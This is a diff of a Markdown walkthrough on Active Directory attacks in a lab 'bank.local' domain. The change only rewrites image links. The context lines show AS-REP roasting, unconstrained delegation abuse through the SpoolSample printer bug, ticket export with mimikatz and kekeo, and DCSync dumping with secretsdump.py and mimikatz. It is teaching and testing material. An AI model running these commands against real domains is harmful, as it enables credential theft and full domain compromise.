@@ -355,11 +355,11 @@ GetNPUsers.py -dc-ip 10.10.10.10 -request 'bank.local/AsrepRoastUser' -no-pass
 
 1. Create a Domain Join Computer and go to Server Manager -> Tools -> Active Directory Users and Computers. Click on Computer -> Right Click on the Domain join Computer -> Click on Properties.
 
-![[Pasted image 20210811222825.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811222825.png)
 
 2. Go to Delegation tab and tick on **"Trust this computer for delegation to any service (Kerberos)"** and click Apply.
 
-![[Pasted image 20210811222909.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811222909.png)
 
 ### Detect
 
@@ -386,7 +386,7 @@ LDAP://CN=DC01,OU=Domain Controllers,DC=bank,DC=local {ridsetreferences, logonco
 LDAP://CN=VULN01,CN=Computers,DC=bank,DC=local        {logoncount, codepage, objectcategory, iscriticalsystemobject...}
 ```
 
-![[Pasted image 20210811224149.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811224149.png)
 
 2. Check if a spool service is running on a remote host
 
@@ -394,7 +394,7 @@ LDAP://CN=VULN01,CN=Computers,DC=bank,DC=local        {logoncount, codepage, obj
 ls \\dc01\pipe\spoolss
 ```
 
-![[Pasted image 20210811225305.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811225305.png)
 
 ### Attack
 
@@ -424,9 +424,9 @@ https://github.com/leechristensen/SpoolSample.git
 .\SpoolSample.exe DC01.bank.local VULN01.bank.local
 ```
 
-![[Pasted image 20210811231133.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811231133.png)
 
-![[Pasted image 20210811231146.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811231146.png)
 
 **2. Using secretdumps to perform dcsync**
 
@@ -436,11 +436,11 @@ https://github.com/leechristensen/SpoolSample.git
 sekurlsa::tickets /export
 ```
 
-![[Pasted image 20210811232703.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811232703.png)
 
 - We can see that there is DC **(kirbi file)**
 
-![[Pasted image 20210811232724.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811232724.png)
 
 - Download **kekeo** and use this command. We will convert the kirbi file to a ccache file.
 
@@ -452,7 +452,7 @@ https://github.com/gentilkiwi/kekeo
 misc::convert ccache dc01.kirbi
 ```
 
-![[Pasted image 20210811233303.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811233303.png)
 
 - Transfer the ccache file to attacker machine. Then use this commands to export the ccache file.
 
@@ -467,11 +467,11 @@ export KRB5CCNAME=dc01.ccaches
 secretsdump.py -k DC01.bank.local -just-dc
 ```
 
-![[Pasted image 20210811235053.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811235053.png)
 
 - Take notes to add **"DC01.bank.local"** and **"bank.local"** in /etc/hosts
 
-![[Pasted image 20210811235232.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811235232.png)
 
 **3. Using mimikatz to perform dcsync**
 
@@ -483,7 +483,7 @@ lsadump::dcsync /domain:bank.local /all /csv
 lsadump::dcsync /domain:bank.local /user:DC01$
 ```
 
-![[Pasted image 20210811235404.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811235404.png)
 
 ### References
 
